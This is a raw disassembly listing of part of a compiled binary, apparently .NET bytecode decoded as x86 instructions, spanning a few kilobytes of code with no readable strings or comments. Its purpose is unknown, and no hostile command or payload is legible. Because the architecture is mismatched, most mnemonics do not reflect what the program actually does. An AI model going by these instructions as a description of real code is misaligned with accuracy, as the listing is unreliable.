  402b4a:	0a 28                	or     (%eax),%ch
  402b4c:	31 00                	xor    %eax,(%eax)
  402b4e:	00 06                	add    %al,(%esi)
  402b50:	28 23                	sub    %ah,(%ebx)
  402b52:	00 00                	add    %al,(%eax)
  402b54:	06                   	push   %es
  402b55:	7e 18                	jle    0x402b6f
  402b57:	00 00                	add    %al,(%eax)
  402b59:	04 6f                	add    $0x6f,%al
  402b5b:	63 00                	arpl   %eax,(%eax)
  402b5d:	00 0a                	add    %cl,(%edx)
  402b5f:	26 17                	es pop %ss
  402b61:	2d c8 2a c6 16       	sub    $0x16c62ac8,%eax
  402b66:	80 12 00             	adcb   $0x0,(%edx)
  402b69:	00 04 14             	add    %al,(%esp,%edx,1)
  402b6c:	80 13 00             	adcb   $0x0,(%ebx)
  402b6f:	00 04 16             	add    %al,(%esi,%edx,1)
  402b72:	6a 80                	push   $0xffffff80
  402b74:	14 00                	adc    $0x0,%al
  402b76:	00 04 14             	add    %al,(%esp,%edx,1)
  402b79:	80 16 00             	adcb   $0x0,(%esi)
  402b7c:	00 04 14             	add    %al,(%esp,%edx,1)
  402b7f:	80 17 00             	adcb   $0x0,(%edi)
  402b82:	00 04 16             	add    %al,(%esi,%edx,1)
  402b85:	73 66                	jae    0x402bed
  402b87:	00 00                	add    %al,(%eax)
  402b89:	0a 80 18 00 00 04    	or     0x4000018(%eax),%al
  402b8f:	14 80                	adc    $0x80,%al
  402b91:	19 00                	sbb    %eax,(%eax)
  402b93:	00 04 2a             	add    %al,(%edx,%ebp,1)
  402b96:	00 00                	add    %al,(%eax)
  402b98:	1e                   	push   %ds
  402b99:	02 28                	add    (%eax),%ch
  402b9b:	17                   	pop    %ss
  402b9c:	00 00                	add    %al,(%eax)
  402b9e:	0a 2a                	or     (%edx),%ch
  402ba0:	1b 30                	sbb    (%eax),%esi
  402ba2:	06                   	push   %es
  402ba3:	00 aa 00 00 00 13    	add    %ch,0x13000000(%edx)
  402ba9:	00 00                	add    %al,(%eax)
  402bab:	11 7e 06             	adc    %edi,0x6(%esi)
  402bae:	00 00                	add    %al,(%eax)
  402bb0:	04 17                	add    $0x17,%al
  402bb2:	8d 49 00             	lea    0x0(%ecx),%ecx
  402bb5:	00 01                	add    %al,(%ecx)
  402bb7:	13 04 11             	adc    (%ecx,%edx,1),%eax
  402bba:	04 16                	add    $0x16,%al
  402bbc:	1f                   	pop    %ds
  402bbd:	2c 9d                	sub    $0x9d,%al
  402bbf:	11 04 6f             	adc    %eax,(%edi,%ebp,2)
  402bc2:	67 00 00             	add    %al,(%bx,%si)
  402bc5:	0a 73 61             	or     0x61(%ebx),%dh
  402bc8:	00 00                	add    %al,(%eax)
  402bca:	0a 7e 06             	or     0x6(%esi),%bh
  402bcd:	00 00                	add    %al,(%eax)
  402bcf:	04 17                	add    $0x17,%al
  402bd1:	8d 49 00             	lea    0x0(%ecx),%ecx
  402bd4:	00 01                	add    %al,(%ecx)
  402bd6:	13 05 11 05 16 1f    	adc    0x1f160511,%eax
  402bdc:	2c 9d                	sub    $0x9d,%al
  402bde:	11 05 6f 67 00 00    	adc    %eax,0x676f
  402be4:	0a 8e b7 6f 68 00    	or     0x686fb7(%esi),%cl
  402bea:	00 0a                	add    %cl,(%edx)
  402bec:	9a 0a 06 28 66 00 00 	lcall  $0x0,$0x6628060a
  402bf3:	06                   	push   %es
  402bf4:	2c 48                	sub    $0x48,%al
  402bf6:	06                   	push   %es
  402bf7:	28 69 00             	sub    %ch,0x0(%ecx)
  402bfa:	00 0a                	add    %cl,(%edx)
  402bfc:	0b 07                	or     (%edi),%eax
  402bfe:	13 07                	adc    (%edi),%eax
  402c00:	16                   	push   %ss
  402c01:	13 06                	adc    (%esi),%eax
  402c03:	2b 2f                	sub    (%edi),%ebp
  402c05:	11 07                	adc    %eax,(%edi)
  402c07:	11 06                	adc    %eax,(%esi)
  402c09:	9a 0c 08 6f 6a 00 00 	lcall  $0x0,$0x6a6f080c
  402c10:	0a 28                	or     (%eax),%ch
  402c12:	24 00                	and    $0x0,%al
  402c14:	00 06                	add    %al,(%esi)
  402c16:	26 7e 12             	es jle 0x402c2b
  402c19:	00 00                	add    %al,(%eax)
  402c1b:	04 2c                	add    $0x2c,%al
  402c1d:	02 de                	add    %dh,%bl
  402c1f:	1c de                	sbb    $0xde,%al
  402c21:	0c 28                	or     $0x28,%al
  402c23:	25 00 00 0a 28       	and    $0x280a0000,%eax
  402c28:	27                   	daa
  402c29:	00 00                	add    %al,(%eax)
  402c2b:	0a de                	or     %dh,%bl
  402c2d:	00 11                	add    %dl,(%ecx)
  402c2f:	06                   	push   %es
  402c30:	17                   	pop    %ss
  402c31:	d6                   	salc
  402c32:	13 06                	adc    (%esi),%eax
  402c34:	11 06                	adc    %eax,(%esi)
  402c36:	11 07                	adc    %eax,(%edi)
  402c38:	8e b7 32 c9 2b 07    	mov    0x72bc932(%edi),%?
  402c3e:	06                   	push   %es
  402c3f:	28 24 00             	sub    %ah,(%eax,%eax,1)
  402c42:	00 06                	add    %al,(%esi)
  402c44:	26 de 0e             	fimuls %es:(%esi)
  402c47:	25 28 25 00 00       	and    $0x2528,%eax
  402c4c:	0a 0d 28 27 00 00    	or     0x2728,%cl
  402c52:	0a de                	or     %dh,%bl
  402c54:	00 2a                	add    %ch,(%edx)
  402c56:	00 00                	add    %al,(%eax)
  402c58:	01 1c 00             	add    %ebx,(%eax,%eax,1)
  402c5b:	00 00                	add    %al,(%eax)
  402c5d:	00 5f 00             	add    %bl,0x0(%edi)
  402c60:	17                   	pop    %ss
  402c61:	76 00                	jbe    0x402c63
  402c63:	0c 29                	or     $0x29,%al
  402c65:	00 00                	add    %al,(%eax)
  402c67:	01 00                	add    %eax,(%eax)
  402c69:	00 00                	add    %al,(%eax)
  402c6b:	00 9b 9b 00 0e 29    	add    %bl,0x290e009b(%ebx)
  402c71:	00 00                	add    %al,(%eax)
  402c73:	01 1b                	add    %ebx,(%ebx)
  402c75:	30 07                	xor    %al,(%edi)
  402c77:	00 30                	add    %dh,(%eax)
  402c79:	01 00                	add    %eax,(%eax)
  402c7b:	00 14 00             	add    %dl,(%eax,%eax,1)
  402c7e:	00 11                	add    %dl,(%ecx)
  402c80:	18 17                	sbb    %dl,(%edi)
  402c82:	1c 73                	sbb    $0x73,%al
  402c84:	6b 00 00             	imul   $0x0,(%eax),%eax
  402c87:	0a 80 13 00 00 04    	or     0x4000013(%eax),%al
  402c8d:	15 6a 80 14 00       	adc    $0x14806a,%eax
  402c92:	00 04 17             	add    %al,(%edi,%edx,1)
  402c95:	8d 4f 00             	lea    0x0(%edi),%ecx
  402c98:	00 01                	add    %al,(%ecx)
  402c9a:	80 15 00 00 04 73 6c 	adcb   $0x6c,0x73040000
  402ca1:	00 00                	add    %al,(%eax)
  402ca3:	0a 80 16 00 00 04    	or     0x4000016(%eax),%al
  402ca9:	7e 13                	jle    0x402cbe
  402cab:	00 00                	add    %al,(%eax)
  402cad:	04 20                	add    $0x20,%al
  402caf:	00 c8                	add    %cl,%al
  402cb1:	00 00                	add    %al,(%eax)
  402cb3:	6f                   	outsl  %ds:(%esi),(%dx)
  402cb4:	6d                   	insl   (%dx),%es:(%edi)
  402cb5:	00 00                	add    %al,(%eax)
  402cb7:	0a 7e 13             	or     0x13(%esi),%bh
  402cba:	00 00                	add    %al,(%eax)
  402cbc:	04 20                	add    $0x20,%al
  402cbe:	00 c8                	add    %cl,%al
  402cc0:	00 00                	add    %al,(%eax)
  402cc2:	6f                   	outsl  %ds:(%esi),(%dx)
  402cc3:	6e                   	outsb  %ds:(%esi),(%dx)
  402cc4:	00 00                	add    %al,(%eax)
  402cc6:	0a 7e 13             	or     0x13(%esi),%bh
  402cc9:	00 00                	add    %al,(%eax)
  402ccb:	04 02                	add    $0x2,%al
  402ccd:	7e 08                	jle    0x402cd7
  402ccf:	00 00                	add    %al,(%eax)
  402cd1:	04 28                	add    $0x28,%al
  402cd3:	1d 00 00 0a 6f       	sbb    $0x6f0a0000,%eax
  402cd8:	6f                   	outsl  %ds:(%esi),(%dx)
  402cd9:	00 00                	add    %al,(%eax)
  402cdb:	0a 02                	or     (%edx),%al
  402cdd:	80 07 00             	addb   $0x0,(%edi)
  402ce0:	00 04 17             	add    %al,(%edi,%edx,1)
  402ce3:	80 12 00             	adcb   $0x0,(%edx)
  402ce6:	00 04 73             	add    %al,(%ebx,%esi,2)
  402ce9:	17                   	pop    %ss
  402cea:	00 00                	add    %al,(%eax)
  402cec:	0a 28                	or     (%eax),%ch
  402cee:	11 00                	adc    %eax,(%eax)
  402cf0:	00 0a                	add    %cl,(%edx)
  402cf2:	80 19 00             	sbbb   $0x0,(%ecx)
  402cf5:	00 04 28             	add    %al,(%eax,%ebp,1)
  402cf8:	25 00 00 06 28       	and    $0x28060000,%eax
  402cfd:	23 00                	and    (%eax),%eax
  402cff:	00 0a                	add    %cl,(%edx)
  402d01:	28 2f                	sub    %ch,(%edi)
  402d03:	00 00                	add    %al,(%eax)
  402d05:	06                   	push   %es
  402d06:	16                   	push   %ss
  402d07:	80 1c 00 00          	sbbb   $0x0,(%eax,%eax,1)
  402d0b:	04 7e                	add    $0x7e,%al
  402d0d:	13 00                	adc    (%eax),%eax
  402d0f:	00 04 7e             	add    %al,(%esi,%edi,2)
  402d12:	15 00 00 04 16       	adc    $0x16040000,%eax
  402d17:	7e 15                	jle    0x402d2e
  402d19:	00 00                	add    %al,(%eax)
  402d1b:	04 8e                	add    $0x8e,%al
  402d1d:	b7 16                	mov    $0x16,%bh
  402d1f:	14 fe                	adc    $0xfe,%al
  402d21:	06                   	push   %es
  402d22:	2d 00 00 06 73       	sub    $0x73060000,%eax
  402d27:	70 00                	jo     0x402d29
  402d29:	00 0a                	add    %cl,(%edx)
  402d2b:	14 6f                	adc    $0x6f,%al
  402d2d:	71 00                	jno    0x402d2f
  402d2f:	00 0a                	add    %cl,(%edx)
  402d31:	26 14 fe             	es adc $0xfe,%al
  402d34:	06                   	push   %es
  402d35:	34 00                	xor    $0x0,%al
  402d37:	00 06                	add    %al,(%esi)
  402d39:	73 72                	jae    0x402dad
  402d3b:	00 00                	add    %al,(%eax)
  402d3d:	0a 0b                	or     (%ebx),%cl
  402d3f:	07                   	pop    %es
  402d40:	14 73                	adc    $0x73,%al
  402d42:	61                   	popa
  402d43:	00 00                	add    %al,(%eax)
  402d45:	0a 20                	or     (%eax),%ah
  402d47:	10 27                	adc    %ah,(%edi)
  402d49:	00 00                	add    %al,(%eax)
  402d4b:	20 98 3a 00 00 6f    	and    %bl,0x6f00003a(%eax)
  402d51:	62 00                	bound  %eax,(%eax)
  402d53:	00 0a                	add    %cl,(%edx)
  402d55:	73 61                	jae    0x402db8
  402d57:	00 00                	add    %al,(%eax)
  402d59:	0a 20                	or     (%eax),%ah
  402d5b:	10 27                	adc    %ah,(%edi)
  402d5d:	00 00                	add    %al,(%eax)
  402d5f:	20 98 3a 00 00 6f    	and    %bl,0x6f00003a(%eax)
  402d65:	62 00                	bound  %eax,(%eax)
  402d67:	00 0a                	add    %cl,(%edx)
  402d69:	73 73                	jae    0x402dde
  402d6b:	00 00                	add    %al,(%eax)
  402d6d:	0a 80 17 00 00 04    	or     0x4000017(%eax),%al
  402d73:	14 fe                	adc    $0xfe,%al
  402d75:	06                   	push   %es
  402d76:	32 00                	xor    (%eax),%al
  402d78:	00 06                	add    %al,(%esi)
  402d7a:	73 72                	jae    0x402dee
  402d7c:	00 00                	add    %al,(%eax)
  402d7e:	0a 14 17             	or     (%edi,%edx,1),%dl
  402d81:	17                   	pop    %ss
  402d82:	73 73                	jae    0x402df7
  402d84:	00 00                	add    %al,(%eax)
  402d86:	0a 80 1a 00 00 04    	or     0x400001a(%eax),%al
  402d8c:	de 20                	fisubs (%eax)
  402d8e:	25 28 25 00 00       	and    $0x2528,%eax
  402d93:	0a 0c 16             	or     (%esi,%edx,1),%cl
  402d96:	80 12 00             	adcb   $0x0,(%edx)
  402d99:	00 04 28             	add    %al,(%eax,%ebp,1)
  402d9c:	27                   	daa
  402d9d:	00 00                	add    %al,(%eax)
  402d9f:	0a de                	or     %dh,%bl
  402da1:	0c 7e                	or     $0x7e,%al
  402da3:	18 00                	sbb    %al,(%eax)
  402da5:	00 04 6f             	add    %al,(%edi,%ebp,2)
  402da8:	74 00                	je     0x402daa
  402daa:	00 0a                	add    %cl,(%edx)
  402dac:	26 dc 06             	faddl  %es:(%esi)
  402daf:	2a 41 34             	sub    0x34(%ecx),%al
	...
  402dba:	00 00                	add    %al,(%eax)
  402dbc:	0e                   	push   %cs
  402dbd:	01 00                	add    %eax,(%eax)
  402dbf:	00 0e                	add    %cl,(%esi)
  402dc1:	01 00                	add    %eax,(%eax)
  402dc3:	00 14 00             	add    %dl,(%eax,%eax,1)
  402dc6:	00 00                	add    %al,(%eax)
  402dc8:	29 00                	sub    %eax,(%eax)
  402dca:	00 01                	add    %al,(%ecx)
  402dcc:	02 00                	add    (%eax),%al
  402dce:	00 00                	add    %al,(%eax)
  402dd0:	00 00                	add    %al,(%eax)
  402dd2:	00 00                	add    %al,(%eax)
  402dd4:	22 01                	and    (%ecx),%al
  402dd6:	00 00                	add    %al,(%eax)
  402dd8:	22 01                	and    (%ecx),%al
  402dda:	00 00                	add    %al,(%eax)
  402ddc:	0c 00                	or     $0x0,%al
  402dde:	00 00                	add    %al,(%eax)
  402de0:	00 00                	add    %al,(%eax)
  402de2:	00 00                	add    %al,(%eax)
  402de4:	13 30                	adc    (%eax),%esi
  402de6:	05 00 58 01 00       	add    $0x15800,%eax
  402deb:	00 15 00 00 11 73    	add    %dl,0x73110000
  402df1:	54                   	push   %esp
  402df2:	00 00                	add    %al,(%eax)
  402df4:	0a 0b                	or     (%ebx),%cl
  402df6:	1f                   	pop    %ds
  402df7:	1b 8d 03 00 00 01    	sbb    0x1000003(%ebp),%ecx
  402dfd:	0d 09 16 72 d9       	or     $0xd9721609,%eax
  402e02:	05 00 70 a2 09       	add    $0x9a27000,%eax
  402e07:	17                   	pop    %ss
  402e08:	7e 0a                	jle    0x402e14
  402e0a:	00 00                	add    %al,(%eax)
  402e0c:	04 a2                	add    $0xa2,%al
  402e0e:	09 18                	or     %ebx,(%eax)
  402e10:	28 72 00             	sub    %dh,0x0(%edx)
  402e13:	00 06                	add    %al,(%esi)
  402e15:	a2 09 19 7e 0a       	mov    %al,0xa7e1909
  402e1a:	00 00                	add    %al,(%eax)
  402e1c:	04 a2                	add    $0xa2,%al
  402e1e:	09 1a                	or     %ebx,(%edx)
  402e20:	28 75 00             	sub    %dh,0x0(%ebp)
  402e23:	00 0a                	add    %cl,(%edx)
  402e25:	a2 09 1b 7e 0a       	mov    %al,0xa7e1b09
  402e2a:	00 00                	add    %al,(%eax)
  402e2c:	04 a2                	add    $0xa2,%al
  402e2e:	09 1c 07             	or     %ebx,(%edi,%eax,1)
  402e31:	6f                   	outsl  %ds:(%esi),(%dx)
  402e32:	55                   	push   %ebp
  402e33:	00 00                	add    %al,(%eax)
  402e35:	0a 72 e3             	or     -0x1d(%edx),%dh
  402e38:	05 00 70 14 6f       	add    $0x6f147000,%eax
  402e3d:	76 00                	jbe    0x402e3f
  402e3f:	00 0a                	add    %cl,(%edx)
  402e41:	a2 09 1d 28 77       	mov    %al,0x77281d09
  402e46:	00 00                	add    %al,(%eax)
  402e48:	0a 6f 78             	or     0x78(%edi),%ch
  402e4b:	00 00                	add    %al,(%eax)
  402e4d:	0a 72 f7             	or     -0x9(%edx),%dh
  402e50:	05 00 70 72 11       	add    $0x11727000,%eax
  402e55:	06                   	push   %es
  402e56:	00 70 6f             	add    %dh,0x6f(%eax)
  402e59:	76 00                	jbe    0x402e5b
  402e5b:	00 0a                	add    %cl,(%edx)
  402e5d:	72 17                	jb     0x402e76
  402e5f:	06                   	push   %es
  402e60:	00 70 28             	add    %dh,0x28(%eax)
  402e63:	1f                   	pop    %ds
  402e64:	00 00                	add    %al,(%eax)
  402e66:	0a a2 09 1e 28 79    	or     0x79281e09(%edx),%ah
  402e6c:	00 00                	add    %al,(%eax)
  402e6e:	0a 0c 12             	or     (%edx,%edx,1),%cl
  402e71:	02 28                	add    (%eax),%ch
  402e73:	7a 00                	jp     0x402e75
  402e75:	00 0a                	add    %cl,(%edx)
  402e77:	72 1b                	jb     0x402e94
  402e79:	06                   	push   %es
  402e7a:	00 70 72             	add    %dh,0x72(%eax)
  402e7d:	27                   	daa
  402e7e:	06                   	push   %es
  402e7f:	00 70 6f             	add    %dh,0x6f(%eax)
  402e82:	76 00                	jbe    0x402e84
  402e84:	00 0a                	add    %cl,(%edx)
  402e86:	72 33                	jb     0x402ebb
  402e88:	06                   	push   %es
  402e89:	00 70 72             	add    %dh,0x72(%eax)
  402e8c:	3d 06 00 70 6f       	cmp    $0x6f700006,%eax
  402e91:	76 00                	jbe    0x402e93
  402e93:	00 0a                	add    %cl,(%edx)
  402e95:	a2 09 1f 09 7e       	mov    %al,0x7e091f09
  402e9a:	0a 00                	or     (%eax),%al
  402e9c:	00 04 a2             	add    %al,(%edx,%eiz,4)
  402e9f:	09 1f                	or     %ebx,(%edi)
  402ea1:	0a 7e 0c             	or     0xc(%esi),%bh
  402ea4:	00 00                	add    %al,(%eax)
  402ea6:	04 a2                	add    $0xa2,%al
  402ea8:	09 1f                	or     %ebx,(%edi)
  402eaa:	0b 7e 0a             	or     0xa(%esi),%edi
  402ead:	00 00                	add    %al,(%eax)
  402eaf:	04 a2                	add    $0xa2,%al
  402eb1:	09 1f                	or     %ebx,(%edi)
  402eb3:	0c 28                	or     $0x28,%al
  402eb5:	26 00 00             	add    %al,%es:(%eax)
  402eb8:	06                   	push   %es
  402eb9:	a2 09 1f 0d 7e       	mov    %al,0x7e0d1f09
  402ebe:	0a 00                	or     (%eax),%al
  402ec0:	00 04 a2             	add    %al,(%edx,%eiz,4)
  402ec3:	09 1f                	or     %ebx,(%edi)
  402ec5:	0e                   	push   %cs
  402ec6:	28 27                	sub    %ah,(%edi)
  402ec8:	00 00                	add    %al,(%eax)
  402eca:	06                   	push   %es
  402ecb:	a2 09 1f 0f 7e       	mov    %al,0x7e0f1f09
  402ed0:	0a 00                	or     (%eax),%al
  402ed2:	00 04 a2             	add    %al,(%edx,%eiz,4)
  402ed5:	09 1f                	or     %ebx,(%edi)
  402ed7:	10 28                	adc    %ch,(%eax)
  402ed9:	28 00                	sub    %al,(%eax)
  402edb:	00 06                	add    %al,(%esi)
  402edd:	a2 09 1f 11 7e       	mov    %al,0x7e111f09
  402ee2:	0a 00                	or     (%eax),%al
  402ee4:	00 04 a2             	add    %al,(%edx,%eiz,4)
  402ee7:	09 1f                	or     %ebx,(%edi)
  402ee9:	12 28                	adc    (%eax),%ch
  402eeb:	40                   	inc    %eax
  402eec:	00 00                	add    %al,(%eax)
  402eee:	06                   	push   %es
  402eef:	8c 38                	mov    %?,(%eax)
  402ef1:	00 00                	add    %al,(%eax)
  402ef3:	01 a2 09 1f 13 7e    	add    %esp,0x7e131f09(%edx)
  402ef9:	0a 00                	or     (%eax),%al
  402efb:	00 04 a2             	add    %al,(%edx,%eiz,4)
  402efe:	09 1f                	or     %ebx,(%edi)
  402f00:	14 28                	adc    $0x28,%al
  402f02:	2b 00                	sub    (%eax),%eax
  402f04:	00 06                	add    %al,(%esi)
  402f06:	a2 09 1f 15 7e       	mov    %al,0x7e151f09
  402f0b:	0a 00                	or     (%eax),%al
  402f0d:	00 04 a2             	add    %al,(%edx,%eiz,4)
  402f10:	09 1f                	or     %ebx,(%edi)
  402f12:	16                   	push   %ss
  402f13:	28 2a                	sub    %ch,(%edx)
  402f15:	00 00                	add    %al,(%eax)
  402f17:	06                   	push   %es
  402f18:	a2 09 1f 17 7e       	mov    %al,0x7e171f09
  402f1d:	0a 00                	or     (%eax),%al
  402f1f:	00 04 a2             	add    %al,(%edx,%eiz,4)
  402f22:	09 1f                	or     %ebx,(%edi)
  402f24:	18 28                	sbb    %ch,(%eax)
  402f26:	2c 00                	sub    $0x0,%al
  402f28:	00 06                	add    %al,(%esi)
  402f2a:	a2 09 1f 19 7e       	mov    %al,0x7e191f09
  402f2f:	0a 00                	or     (%eax),%al
  402f31:	00 04 a2             	add    %al,(%edx,%eiz,4)
  402f34:	09 1f                	or     %ebx,(%edi)
  402f36:	1a 28                	sbb    (%eax),%ch
  402f38:	29 00                	sub    %eax,(%eax)
  402f3a:	00 06                	add    %al,(%esi)
  402f3c:	a2 09 28 7b 00       	mov    %al,0x7b2809
  402f41:	00 0a                	add    %cl,(%edx)
  402f43:	0a 2b                	or     (%ebx),%ch
  402f45:	00 06                	add    %al,(%esi)
  402f47:	2a 1b                	sub    (%ebx),%bl
  402f49:	30 02                	xor    %al,(%edx)
  402f4b:	00 40 00             	add    %al,0x0(%eax)
  402f4e:	00 00                	add    %al,(%eax)
  402f50:	16                   	push   %ss
  402f51:	00 00                	add    %al,(%eax)
  402f53:	11 7e 2d             	adc    %edi,0x2d(%esi)
  402f56:	00 00                	add    %al,(%eax)
  402f58:	04 73                	add    $0x73,%al
  402f5a:	29 00                	sub    %eax,(%eax)
  402f5c:	00 0a                	add    %cl,(%edx)
  402f5e:	0b 07                	or     (%edi),%eax
  402f60:	6f                   	outsl  %ds:(%esi),(%dx)
  402f61:	7c 00                	jl     0x402f63
  402f63:	00 0a                	add    %cl,(%edx)
  402f65:	0d 12 03 72 49       	or     $0x49720312,%eax
  402f6a:	06                   	push   %es
  402f6b:	00 70 28             	add    %dh,0x28(%eax)
  402f6e:	7d 00                	jge    0x402f70
  402f70:	00 0a                	add    %cl,(%edx)
  402f72:	0a de                	or     %dh,%bl
  402f74:	1d de 1b 25 28       	sbb    $0x28251bde,%eax
  402f79:	25 00 00 0a 0c       	and    $0xc0a0000,%eax
  402f7e:	72 5d                	jb     0x402fdd
  402f80:	06                   	push   %es
  402f81:	00 70 0a             	add    %dh,0xa(%eax)
  402f84:	28 27                	sub    %ah,(%edi)
  402f86:	00 00                	add    %al,(%eax)
  402f88:	0a de                	or     %dh,%bl
  402f8a:	07                   	pop    %es
  402f8b:	28 27                	sub    %ah,(%edi)
  402f8d:	00 00                	add    %al,(%eax)
  402f8f:	0a de                	or     %dh,%bl
  402f91:	00 06                	add    %al,(%esi)
  402f93:	2a 01                	sub    (%ecx),%al
  402f95:	10 00                	adc    %al,(%eax)
  402f97:	00 00                	add    %al,(%eax)
  402f99:	00 00                	add    %al,(%eax)
  402f9b:	00 23                	add    %ah,(%ebx)
  402f9d:	23 00                	and    (%eax),%eax
  402f9f:	1b 29                	sbb    (%ecx),%ebp
  402fa1:	00 00                	add    %al,(%eax)
  402fa3:	01 1b                	add    %ebx,(%ebx)
  402fa5:	30 03                	xor    %al,(%ebx)
  402fa7:	00 49 00             	add    %cl,0x0(%ecx)
  402faa:	00 00                	add    %al,(%eax)
  402fac:	17                   	pop    %ss
  402fad:	00 00                	add    %al,(%eax)
  402faf:	11 7e 2d             	adc    %edi,0x2d(%esi)
  402fb2:	00 00                	add    %al,(%eax)
  402fb4:	04 28                	add    $0x28,%al
  402fb6:	4f                   	dec    %edi
  402fb7:	00 00                	add    %al,(%eax)
  402fb9:	0a 7e 0d             	or     0xd(%esi),%bh
  402fbc:	00 00                	add    %al,(%eax)
  402fbe:	04 16                	add    $0x16,%al
  402fc0:	28 5b 00             	sub    %bl,0x0(%ebx)
  402fc3:	00 0a                	add    %cl,(%edx)
  402fc5:	16                   	push   %ss
  402fc6:	33 0a                	xor    (%edx),%ecx
  402fc8:	72 33                	jb     0x402ffd
  402fca:	06                   	push   %es
  402fcb:	00 70 0a             	add    %dh,0xa(%eax)
  402fce:	de 27                	fisubs (%edi)
  402fd0:	2b 08                	sub    (%eax),%ecx
  402fd2:	72 1b                	jb     0x402fef
  402fd4:	06                   	push   %es
  402fd5:	00 70 0a             	add    %dh,0xa(%eax)
  402fd8:	de 1d de 1b 25 28    	ficomps 0x28251bde
  402fde:	25 00 00 0a 0b       	and    $0xb0a0000,%eax
  402fe3:	72 5d                	jb     0x403042
  402fe5:	06                   	push   %es
  402fe6:	00 70 0a             	add    %dh,0xa(%eax)
  402fe9:	28 27                	sub    %ah,(%edi)
  402feb:	00 00                	add    %al,(%eax)
  402fed:	0a de                	or     %dh,%bl
  402fef:	07                   	pop    %es
  402ff0:	28 27                	sub    %ah,(%edi)
  402ff2:	00 00                	add    %al,(%eax)
  402ff4:	0a de                	or     %dh,%bl
  402ff6:	00 06                	add    %al,(%esi)
  402ff8:	2a 00                	sub    (%eax),%al
  402ffa:	00 00                	add    %al,(%eax)
  402ffc:	01 10                	add    %edx,(%eax)
  402ffe:	00 00                	add    %al,(%eax)
  403000:	00 00                	add    %al,(%eax)
  403002:	00 00                	add    %al,(%eax)
  403004:	2c 2c                	sub    $0x2c,%al
  403006:	00 1b                	add    %bl,(%ebx)
  403008:	29 00                	sub    %eax,(%eax)
  40300a:	00 01                	add    %al,(%ecx)
  40300c:	1b 30                	sbb    (%eax),%esi
  40300e:	02 00                	add    (%eax),%al
  403010:	3e 00 00             	add    %al,%ds:(%eax)
  403013:	00 18                	add    %bl,(%eax)
  403015:	00 00                	add    %al,(%eax)
  403017:	11 28                	adc    %ebp,(%eax)
  403019:	7e 00                	jle    0x40301b
  40301b:	00 0a                	add    %cl,(%edx)
  40301d:	73 7f                	jae    0x40309e
  40301f:	00 00                	add    %al,(%eax)
  403021:	0a 20                	or     (%eax),%ah
  403023:	20 02                	and    %al,(%edx)
  403025:	00 00                	add    %al,(%eax)
  403027:	6f                   	outsl  %ds:(%esi),(%dx)
  403028:	80 00 00             	addb   $0x0,(%eax)
  40302b:	0a 0c 12             	or     (%edx,%edx,1),%cl
  40302e:	02 28                	add    (%eax),%ch
  403030:	7a 00                	jp     0x403032
  403032:	00 0a                	add    %cl,(%edx)
  403034:	0a de                	or     %dh,%bl
  403036:	1d de 1b 25 28       	sbb    $0x28251bde,%eax
  40303b:	25 00 00 0a 0b       	and    $0xb0a0000,%eax
  403040:	72 5d                	jb     0x40309f
  403042:	06                   	push   %es
  403043:	00 70 0a             	add    %dh,0xa(%eax)
  403046:	28 27                	sub    %ah,(%edi)
  403048:	00 00                	add    %al,(%eax)
  40304a:	0a de                	or     %dh,%bl
  40304c:	07                   	pop    %es
  40304d:	28 27                	sub    %ah,(%edi)
  40304f:	00 00                	add    %al,(%eax)
  403051:	0a de                	or     %dh,%bl
  403053:	00 06                	add    %al,(%esi)
  403055:	2a 00                	sub    (%eax),%al
  403057:	00 01                	add    %al,(%ecx)
  403059:	10 00                	adc    %al,(%eax)
  40305b:	00 00                	add    %al,(%eax)
  40305d:	00 00                	add    %al,(%eax)
  40305f:	00 21                	add    %ah,(%ecx)
  403061:	21 00                	and    %eax,(%eax)
  403063:	1b 29                	sbb    (%ecx),%ebp
  403065:	00 00                	add    %al,(%eax)
  403067:	01 1b                	add    %ebx,(%ebx)
  403069:	30 04 00             	xor    %al,(%eax,%eax,1)
  40306c:	cf                   	iret
  40306d:	00 00                	add    %al,(%eax)
  40306f:	00 19                	add    %bl,(%ecx)
  403071:	00 00                	add    %al,(%eax)
  403073:	11 72 69             	adc    %esi,0x69(%edx)
  403076:	06                   	push   %es
  403077:	00 70 28             	add    %dh,0x28(%eax)
  40307a:	81 00 00 0a 72 6f    	addl   $0x6f720a00,(%eax)
  403080:	06                   	push   %es
  403081:	00 70 28             	add    %dh,0x28(%eax)
  403084:	28 00                	sub    %al,(%eax)
  403086:	00 0a                	add    %cl,(%edx)
  403088:	72 9b                	jb     0x403025
  40308a:	06                   	push   %es
  40308b:	00 70 73             	add    %dh,0x73(%eax)
  40308e:	82 00 00             	addb   $0x0,(%eax)
  403091:	0a 0b                	or     (%ebx),%cl
  403093:	73 83                	jae    0x403018
  403095:	00 00                	add    %al,(%eax)
  403097:	0a 0c 07             	or     (%edi,%eax,1),%cl
  40309a:	6f                   	outsl  %ds:(%esi),(%dx)
  40309b:	84 00                	test   %al,(%eax)
  40309d:	00 0a                	add    %cl,(%edx)
  40309f:	6f                   	outsl  %ds:(%esi),(%dx)
  4030a0:	85 00                	test   %eax,(%eax)
  4030a2:	00 0a                	add    %cl,(%edx)
  4030a4:	13 05 2b 2b 11 05    	adc    0x5112b2b,%eax
  4030aa:	6f                   	outsl  %ds:(%esi),(%dx)
  4030ab:	86 00                	xchg   %al,(%eax)
  4030ad:	00 0a                	add    %cl,(%edx)
  4030af:	0d 08 09 72 d9       	or     $0xd9720908,%eax
  4030b4:	06                   	push   %es
  4030b5:	00 70 6f             	add    %dh,0x6f(%eax)
  4030b8:	87 00                	xchg   %eax,(%eax)
  4030ba:	00 0a                	add    %cl,(%edx)
  4030bc:	6f                   	outsl  %ds:(%esi),(%dx)
  4030bd:	15 00 00 0a 6f       	adc    $0x6f0a0000,%eax
  4030c2:	88 00                	mov    %al,(%eax)
  4030c4:	00 0a                	add    %cl,(%edx)
  4030c6:	26 08 72 f1          	or     %dh,%es:-0xf(%edx)
  4030ca:	06                   	push   %es
  4030cb:	00 70 6f             	add    %dh,0x6f(%eax)
  4030ce:	88 00                	mov    %al,(%eax)
  4030d0:	00 0a                	add    %cl,(%edx)
  4030d2:	26 11 05 6f 89 00 00 	adc    %eax,%es:0x896f
  4030d9:	0a 2d cc de 0c 11    	or     0x110cdecc,%ch
  4030df:	05 2c 07 11 05       	add    $0x511072c,%eax
  4030e4:	6f                   	outsl  %ds:(%esi),(%dx)
  4030e5:	5e                   	pop    %esi
  4030e6:	00 00                	add    %al,(%eax)
  4030e8:	0a dc                	or     %ah,%bl
  4030ea:	08 6f 8a             	or     %ch,-0x76(%edi)
  4030ed:	00 00                	add    %al,(%eax)
  4030ef:	0a 6f 8b             	or     -0x75(%edi),%ch
